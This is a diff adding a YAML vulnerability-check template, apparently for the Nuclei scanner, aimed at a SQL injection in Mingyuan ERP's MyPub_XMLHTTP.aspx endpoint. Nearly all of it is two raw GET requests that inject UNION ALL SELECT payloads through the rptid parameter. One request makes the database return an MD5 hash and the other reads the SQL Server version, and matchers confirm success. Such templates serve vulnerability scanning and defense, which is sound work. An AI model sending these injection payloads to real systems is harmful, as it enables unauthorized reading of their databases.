@@ -1,0 +1,39 @@
+id: poc-yaml-mingyuanyun-erp-mypub-xmlhttp-aspx-sqli
+info:
+  name: Mingyuan ERP MyPub_XMLHTTP.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: Mingyuan ERP
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%2CNULL%2CNULL-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - body == concat("0x", t2)
+
+  - raw:
+      - |
+        GET /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2C@@version%2CNULL%2CNULL-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Microsoft SQL Server"
